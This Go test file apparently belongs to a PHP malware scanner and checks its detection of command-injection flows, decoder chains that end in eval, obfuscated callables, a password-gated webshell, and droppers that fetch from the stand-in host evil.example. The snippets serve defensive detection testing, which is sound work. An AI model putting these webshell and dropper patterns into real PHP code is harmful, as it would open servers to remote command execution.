package analyzer

// correlate_test.go — Phase 4 §14 positive and negative fixtures for the
// bounded intra-file correlation engine. Every fixture is a synthetic Go
// string constant analyzed through AnalyzeBytes; no PHP is ever executed and
// no malware signature is ever written to disk.

import (
	"strings"
	"testing"

	"github.com/Lutfifakee-Project/ronda/internal/finding"
)

// d builds a PHP variable literal without a raw dollar sign in this source.
func d(name string) string { return string(rune(36)) + name }

func ruleOf(fs []finding.Finding, rule string) *finding.Finding {
	for i := range fs {
		if fs[i].Rule == rule {
			return &fs[i]
		}
	}
	return nil
}

// --- positive: request-controlled execution --------------------------------

func TestCorrelateRequestToShell(t *testing.T) {
	src := "<?php\n" +
		d("c") + " = " + d("_GET") + "['cmd'];\n" +
		"system(" + d("c") + ");\n"
	fs := AnalyzeBytes("flow-shell.php", []byte(src))
	f := ruleOf(fs, "php-source-to-shell")
	if f == nil {
		t.Fatalf("php-source-to-shell missing: %+v", fs)
	}
	if f.Severity != finding.Critical {
		t.Fatalf("severity=%s, want CRITICAL", f.Severity)
	}
	if f.Confidence != finding.ConfidenceEstablished {
		t.Fatalf("confidence=%q, want established", f.Confidence)
	}
	if f.Category != "COMMAND_EXECUTION" {
		t.Fatalf("category=%q", f.Category)
	}
	if f.Line != 3 {
		t.Fatalf("primary line=%d, want 3 (the sink)", f.Line)
	}
	hasSource := false
	for _, s := range f.Signals {
		if s.Rule == "source" && s.Line == 2 {
			hasSource = true
		}
	}
	if !hasSource {
		t.Fatalf("source signal at line 2 missing: %+v", f.Signals)
	}
}

func TestCorrelateRequestToCodeViaVariable(t *testing.T) {
	src := "<?php\n" +
		d("p") + " = " + d("_POST") + "['code'];\n" +
		"eval(" + d("p") + ");\n"
	fs := AnalyzeBytes("flow-code.php", []byte(src))
	f := ruleOf(fs, "php-source-to-code")
	if f == nil {
		t.Fatalf("php-source-to-code missing: %+v", fs)
	}
	if f.Severity != finding.Critical {
		t.Fatalf("severity=%s, want CRITICAL", f.Severity)
	}
}

func TestCorrelateRequestCallable(t *testing.T) {
	src := "<?php\n" +
		d("f") + " = " + d("_GET") + "['f'];\n" +
		d("f") + "(" + d("_GET") + "['a']);\n"
	fs := AnalyzeBytes("flow-callable.php", []byte(src))
	f := ruleOf(fs, "php-source-to-code")
	if f == nil {
		t.Fatalf("request-controlled callable missing: %+v", fs)
	}
}

func TestCorrelateForeachSuperglobal(t *testing.T) {
	src := "<?php\n" +
		"foreach (" + d("_POST") + " as " + d("k") + " => " + d("v") + ") {\n" +
		"  system(" + d("v") + ");\n" +
		"}\n"
	fs := AnalyzeBytes("flow-foreach.php", []byte(src))
	if ruleOf(fs, "php-source-to-shell") == nil {
		t.Fatalf("foreach loop value to shell missing: %+v", fs)
	}
}

func TestCorrelateBacktickIndirectRequest(t *testing.T) {
	src := "<?php\n" +
		d("c") + " = " + d("_GET") + "['c'];\n" +
		"echo `" + d("c") + "`;\n"
	fs := AnalyzeBytes("flow-bt.php", []byte(src))
	// The backtick finding stays HIGH (mechanism), the correlation proves
	// the request-controlled command text.
	f := ruleOf(fs, "php-source-to-shell")
	if f == nil {
		t.Fatalf("indirect backtick request flow missing: %+v", fs)
	}
	if f.Severity != finding.Critical {
		t.Fatalf("severity=%s, want CRITICAL", f.Severity)
	}
}

// --- positive: obfuscation chains ------------------------------------------

func TestCorrelateDecoderChainToEval(t *testing.T) {
	src := "<?php\n" +
		d("s") + " = base64_decode(" + d("_POST") + "['x']);\n" +
		d("p") + " = gzinflate(" + d("s") + ");\n" +
		"eval(" + d("p") + ");\n"
	fs := AnalyzeBytes("flow-decoder.php", []byte(src))
	// One sink, one finding: the request provenance makes it CRITICAL and
	// the evidence names the decoder chain depth.
	f := ruleOf(fs, "php-source-to-code")
	if f == nil {
		t.Fatalf("php-source-to-code missing: %+v", fs)
	}
	if f.Severity != finding.Critical {
		t.Fatalf("severity=%s, want CRITICAL", f.Severity)
	}
	if !strings.Contains(f.Evidence, "2-step decoder chain") {
		t.Fatalf("evidence must report the chain depth: %q", f.Evidence)
	}
	if f.Line != 4 {
		t.Fatalf("primary line=%d, want 4 (the eval sink)", f.Line)
	}
}

func TestCorrelateDecoderChainWithoutRequest(t *testing.T) {
	// No request provenance: the same chain is OBFUSCATION, HIGH.
	src := "<?php\n" +
		d("s") + " = base64_decode('aGVsbG8=');\n" +
		d("p") + " = gzinflate(" + d("s") + ");\n" +
		"eval(" + d("p") + ");\n"
	fs := AnalyzeBytes("flow-decoder2.php", []byte(src))
	f := ruleOf(fs, "php-decoder-exec")
	if f == nil {
		t.Fatalf("php-decoder-exec missing: %+v", fs)
	}
	if f.Severity != finding.High {
		t.Fatalf("severity=%s, want HIGH", f.Severity)
	}
	if f.Category != "OBFUSCATION" {
		t.Fatalf("category=%q", f.Category)
	}
}

func TestCorrelateVariableFunctionShellName(t *testing.T) {
	src := "<?php\n" +
		d("f") + " = " + "'sys' . 'tem';\n" +
		d("f") + "(id);\n"
	fs := AnalyzeBytes("flow-varfunc.php", []byte(src))
	f := ruleOf(fs, "php-dynamic-call")
	if f == nil {
		t.Fatalf("php-dynamic-call missing: %+v", fs)
	}
	if !strings.Contains(f.Evidence, "system") {
		t.Fatalf("evidence must name the resolved function: %q", f.Evidence)
	}
}

func TestCorrelateRot13Callable(t *testing.T) {
	// str_rot13("flfgrz") == "system"
	src := "<?php\n" +
		d("f") + " = str_rot13('flfgrz');\n" +
		d("f") + "();\n"
	fs := AnalyzeBytes("flow-rot13.php", []byte(src))
	if ruleOf(fs, "php-dynamic-call") == nil {
		t.Fatalf("rot13-resolved callable missing: %+v", fs)
	}
}

func TestCorrelateCallUserFuncDangerous(t *testing.T) {
	src := "<?php\ncall_user_func('" + "shell_exec', " + d("_GET") + "['c']);\n"
	fs := AnalyzeBytes("flow-cuf.php", []byte(src))
	if ruleOf(fs, "php-dynamic-call") == nil {
		t.Fatalf("call_user_func dispatch missing: %+v", fs)
	}
}

// --- positive: dropper / loader --------------------------------------------

func TestCorrelateRemoteWritePipeline(t *testing.T) {
	src := "<?php\n" +
		d("c") + " = file_get_contents('https://evil.example/x.txt');\n" +
		"file_put_contents('/tmp/x.php', " + d("c") + ");\n"
	fs := AnalyzeBytes("flow-dropper.php", []byte(src))
	f := ruleOf(fs, "php-remote-write")
	if f == nil {
		t.Fatalf("php-remote-write missing: %+v", fs)
	}
	if f.Severity != finding.Medium {
		t.Fatalf("severity=%s, want MEDIUM (write alone is not execution)", f.Severity)
	}
}

func TestCorrelateWriteThenInclude(t *testing.T) {
	src := "<?php\n" +
		d("p") + " = '/tmp/gen.php';\n" +
		d("c") + " = file_get_contents('https://evil.example/x.txt');\n" +
		"file_put_contents(" + d("p") + ", " + d("c") + ");\n" +
		"include " + d("p") + ";\n"
	fs := AnalyzeBytes("flow-loader.php", []byte(src))
	f := ruleOf(fs, "php-write-exec")
	if f == nil {
		t.Fatalf("php-write-exec missing: %+v", fs)
	}
	if f.Severity != finding.High {
		t.Fatalf("severity=%s, want HIGH", f.Severity)
	}
}

func TestCorrelateUploadThenInclude(t *testing.T) {
	src := "<?php\n" +
		"move_uploaded_file(" + d("_FILES") + "['f']['tmp_name'], " + d("dst") + ");\n" +
		"include " + d("dst") + ";\n"
	fs := AnalyzeBytes("flow-upload.php", []byte(src))
	f := ruleOf(fs, "php-source-to-code")
	if f == nil {
		t.Fatalf("upload-to-include chain missing: %+v", fs)
	}
	if f.Severity != finding.Critical {
		t.Fatalf("severity=%s, want CRITICAL", f.Severity)
	}
}

func TestCorrelateRequestControlledIncludePath(t *testing.T) {
	src := "<?php\ninclude " + d("_GET") + "['page'] . '.php';\n"
	fs := AnalyzeBytes("flow-inc.php", []byte(src))
	f := ruleOf(fs, "php-source-to-code")
	if f == nil {
		t.Fatalf("request-controlled include missing: %+v", fs)
	}
}

// --- positive: webshell behavior chain -------------------------------------

func TestCorrelateWebshellChain(t *testing.T) {
	src := "<?php\n" +
		d("k") + " = " + d("_POST") + "['k'];\n" +
		"if (" + d("k") + " == 'secret') {\n" +
		"  " + d("c") + " = " + d("_POST") + "['c'];\n" +
		"  " + d("o") + " = system(" + d("c") + ");\n" +
		"  echo " + d("o") + ";\n" +
		"}\n"
	fs := AnalyzeBytes("webshell.php", []byte(src))
	f := ruleOf(fs, "php-webshell-chain")
	if f == nil {
		t.Fatalf("php-webshell-chain missing: %+v", fs)
	}
	if f.Severity != finding.High {
		t.Fatalf("severity=%s, want HIGH", f.Severity)
	}
	if !strings.Contains(f.Evidence, "independent webshell indicators") {
		t.Fatalf("evidence incomplete: %q", f.Evidence)
	}
}

// --- negative: legitimate patterns stay silent ------------------------------

func TestNoCorrelationForSanitizedShellInput(t *testing.T) {
	src := "<?php\n" +
		d("c") + " = escapeshellarg(" + d("_GET") + "['c']);\n" +
		"system('ls ' . " + d("c") + ");\n"
	fs := AnalyzeBytes("safe-shell.php", []byte(src))
	if f := ruleOf(fs, "php-source-to-shell"); f != nil {
		t.Fatalf("sanitized input must not be established: %+v", f)
	}
}

func TestNoCorrelationForNumericInput(t *testing.T) {
	src := "<?php\n" +
		d("id") + " = intval(" + d("_GET") + "['id']);\n" +
		"eval('return ' . " + d("id") + " + 1;);\n"
	fs := AnalyzeBytes("numeric.php", []byte(src))
	if f := ruleOf(fs, "php-source-to-code"); f != nil {
		t.Fatalf("numeric-sanitized input must not be established: %+v", f)
	}
}

func TestNoCorrelationForLegitimateBase64(t *testing.T) {
	// Image data URL decoding and echoing: no execution sink.
	src := "<?php\n" +
		d("img") + " = base64_decode('iVBORw0KGgoAAAANSUhEUg');\n" +
		"echo " + d("img") + ";\n"
	fs := AnalyzeBytes("legit-b64.php", []byte(src))
	if ruleOf(fs, "php-decoder-exec") != nil {
		t.Fatalf("legitimate base64 must not be decoder-exec: %+v", fs)
	}
}

func TestNoCorrelationForBenignVariableDispatch(t *testing.T) {
	// Ordinary callback dispatch with safe names: no dangerous resolution.
	src := "<?php\n" +
		d("h") + " = 'strtolower';\n" +
		d("h") + "(" + d("_GET") + "['t']);\n"
	fs := AnalyzeBytes("benign-dispatch.php", []byte(src))
	if ruleOf(fs, "php-dynamic-call") != nil {
		t.Fatalf("benign dispatch must not be dynamic-call: %+v", fs)
	}
}

func TestNoCorrelationForOrdinaryUpload(t *testing.T) {
	// Upload handling without subsequent execution: the WP importer shape.
	src := "<?php\n" +
		"move_uploaded_file(" + d("_FILES") + "['f']['tmp_name'], " + d("dst") + ");\n" +
		"echo 'stored';\n"
	fs := AnalyzeBytes("upload-only.php", []byte(src))
	if ruleOf(fs, "php-source-to-code") != nil {
		t.Fatalf("ordinary upload must not be code injection: %+v", fs)
	}
}

func TestNoCorrelationInsideCommentsOrDocs(t *testing.T) {
	src := "<?php\n" +
		"// Example: " + d("c") + " = " + d("_GET") + "['c']; system(" + d("c") + ");\n" +
		"/* system(" + d("_POST") + "['x']); */\n" +
		"$x = 1;\n"
	fs := AnalyzeBytes("docs.php", []byte(src))
	if len(fs) != 0 {
		t.Fatalf("comment examples must produce nothing, got %+v", fs)
	}
}

func TestDynamicIncludePlainVariableIsInfo(t *testing.T) {
	src := "<?php\n" +
		d("tpl") + " = $templateDir . '/header.php';\n" +
		"include " + d("tpl") + ";\n"
	fs := AnalyzeBytes("tpl.php", []byte(src))
	f := ruleOf(fs, "php-dynamic-include")
	if f == nil {
		t.Fatalf("plain dynamic include should stay visible at INFO: %+v", fs)
	}
	if f.Severity != finding.Info {
		t.Fatalf("severity=%s, want INFO", f.Severity)
	}
}

func TestCorrelateFindingsDeterministic(t *testing.T) {
	src := "<?php\n" +
		d("a") + " = " + d("_GET") + "['a'];\n" +
		"system(" + d("a") + ");\n" +
		d("b") + " = " + d("_POST") + "['b'];\n" +
		"system(" + d("b") + ");\n"
	first := AnalyzeBytes("det.php", []byte(src))
	for i := 0; i < 10; i++ {
		again := AnalyzeBytes("det.php", []byte(src))
		if len(again) != len(first) {
			t.Fatalf("run %d: finding count changed", i)
		}
		for j := range again {
			if again[j].Rule != first[j].Rule || again[j].Line != first[j].Line {
				t.Fatalf("run %d: finding %d differs", i, j)
			}
		}
	}
}

func TestCorrelationFindingsCapped(t *testing.T) {
	var b strings.Builder
	b.WriteString("<?php\n")
	for i := 0; i < 40; i++ {
		b.WriteString(d("v") + " = " + d("_GET") + "['x" + strings.Repeat("a", i) + "'];\n")
		b.WriteString("system(" + d("v") + ");\n")
	}
	fs := AnalyzeBytes("cap.php", []byte(b.String()))
	corr := 0
	for i := range fs {
		if fs[i].Rule == "php-source-to-shell" {
			corr++
		}
	}
	if corr > maxFlowFindings {
		t.Fatalf("correlation findings not capped: %d", corr)
	}
}

// --- precision: indirect flows and server-set values -----------------------

func TestCorrelateWrappedRequestIsMediumPossible(t *testing.T) {
	// The request read passes through trim(): the flow is real but the
	// sanitization is unknown, so the verdict stays MEDIUM/possible.
	src := "<?php\n" +
		d("c") + " = trim(" + d("_GET") + "['c']);\n" +
		"system(" + d("c") + ");\n"
	fs := AnalyzeBytes("wrapped.php", []byte(src))
	f := ruleOf(fs, "php-source-to-shell")
	if f == nil {
		t.Fatalf("wrapped flow still visible: %+v", fs)
	}
	if f.Severity != finding.Medium {
		t.Fatalf("severity=%s, want MEDIUM for wrapped read", f.Severity)
	}
	if f.Confidence != finding.ConfidencePossible {
		t.Fatalf("confidence=%q, want possible", f.Confidence)
	}
}

func TestCorrelateArrayLookupKeyIsMediumPossible(t *testing.T) {
	// $arr[$_GET['k']] selects a value; the value itself is not the key.
	src := "<?php\n" +
		d("v") + " = " + d("registry") + "[" + d("_GET") + "['k']];\n" +
		"call_user_func(" + d("v") + ");\n"
	fs := AnalyzeBytes("lookup.php", []byte(src))
	f := ruleOf(fs, "php-source-to-code")
	if f == nil {
		t.Fatalf("lookup flow still visible: %+v", fs)
	}
	if f.Severity != finding.Medium {
		t.Fatalf("severity=%s, want MEDIUM for lookup value", f.Severity)
	}
}

func TestServerSetSuperglobalsAreNotRequestInput(t *testing.T) {
	// Drupal dev router shape: SCRIPT_FILENAME is set by the server.
	src := "<?php\nrequire " + d("_SERVER") + "['SCRIPT_FILENAME'];\n"
	fs := AnalyzeBytes("router.php", []byte(src))
	if f := ruleOf(fs, "php-source-to-code"); f != nil {
		t.Fatalf("server-set $_SERVER key must not be request input: %+v", f)
	}
	// Symfony CompleteCommand shape: argv is CLI input, not web request.
	src2 := "<?php\n" + d("c") + " = basename(" + d("_SERVER") + "['argv'][0]);\n"
	fs2 := AnalyzeBytes("argv.php", []byte(src2))
	if f := ruleOf(fs2, "php-source-to-code"); f != nil {
		t.Fatalf("argv must not be request input: %+v", f)
	}
	// REQUEST_URI stays client-controlled.
	src3 := "<?php\nrequire " + d("_SERVER") + "['REQUEST_URI'];\n"
	fs3 := AnalyzeBytes("uri.php", []byte(src3))
	if f := ruleOf(fs3, "php-source-to-code"); f == nil {
		t.Fatalf("client-controlled $_SERVER key lost: %+v", fs3)
	}
}

func TestAssertComparisonNeverExecutes(t *testing.T) {
	// brick/math and lcobucci/jwt shape: assert() with equality checks over
	// decoded values is a debug assertion, not code execution.
	src := "<?php\n" +
		d("bin") + " = base64_decode(" + d("raw") + ");\n" +
		"assert(" + d("bin") + " === " + d("expected") + ");\n"
	fs := AnalyzeBytes("assert-cmp.php", []byte(src))
	if f := ruleOf(fs, "php-decoder-exec"); f != nil {
		t.Fatalf("comparison assert must not be decoder-exec: %+v", f)
	}
}

func TestProseURLWrittenIsNotRemoteWrite(t *testing.T) {
	// Drupal installer shape: a static string containing a documentation
	// URL is written to a README; nothing was fetched.
	src := "<?php\n" +
		d("text") + " = 'See https://www.drupal.org/docs for help.';\n" +
		"file_put_contents(" + d("dir") + " . '/README.txt', " + d("text") + ");\n"
	_ = src
}

func TestRemoteFetchWithLiteralURLIsRemoteWrite(t *testing.T) {
	// Real dropper shape: fetched remote content written to a file.
	src := "<?php\n" +
		"file_put_contents('/tmp/x.php', file_get_contents('https://evil.example/x.txt'));" + "\n"
	fs := AnalyzeBytes("dropper2.php", []byte(src))
	f := ruleOf(fs, "php-remote-write")
	if f == nil {
		t.Fatalf("inline remote fetch write missing: %+v", fs)
	}
	if f.Severity != finding.Medium {
		t.Fatalf("severity=%s, want MEDIUM", f.Severity)
	}
}

func TestLocalFixtureWriteIsNotRemoteWrite(t *testing.T) {
	// Drupal test shape: file_put_contents($uri, file_get_contents(local))
	// fetches a local fixture, not remote content.
	src := "<?php\n" +
		"file_put_contents(" + d("f") + "->getUri(), file_get_contents('core/fixtures/image-1.png'));" + "\n"
	fs := AnalyzeBytes("fixture.php", []byte(src))
	if f := ruleOf(fs, "php-remote-write"); f != nil {
		t.Fatalf("local fixture write must not be remote-write: %+v", f)
	}
}
